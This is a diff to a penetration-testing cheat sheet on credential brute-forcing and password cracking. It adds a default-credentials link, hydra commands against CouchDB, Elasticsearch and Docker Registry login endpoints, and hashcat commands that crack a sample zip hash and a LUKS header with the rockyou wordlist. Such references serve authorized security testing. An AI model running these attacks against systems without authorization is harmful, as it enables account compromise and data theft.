@@ -4,6 +4,7 @@
 
 **Search in google** for default credentials of the technology that is being used, or **try this links**:
 
+* \*\*\*\*[**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)\*\*\*\*
 * \*\*\*\*[**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)\*\*\*\*
 * \*\*\*\*[**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)\*\*\*\*
 * \*\*\*\*[**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)\*\*\*\*
@@ -87,13 +88,19 @@ nmap --script cassandra-brute -p 9160 <IP>
 
 ```bash
 msf> use auxiliary/scanner/couchdb/couchdb_login
-hydra /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
+```
+
+### Docker Registry
+
+```text
+hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
 
 ### Elasticsearch
 
 ```text
-hydra /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
 ```
 
 ### FTP
@@ -374,6 +381,12 @@ zip2john file.zip > zip.john
 john zip.john
 ```
 
+```bash
+#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
+hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
+.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
+```
+
 ### 7z
 
 ```bash
@@ -456,7 +469,7 @@ mount /dev/mapper/mylucksopen /mnt
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
-hashcat -m 14600 luckshash 
+hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
 cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
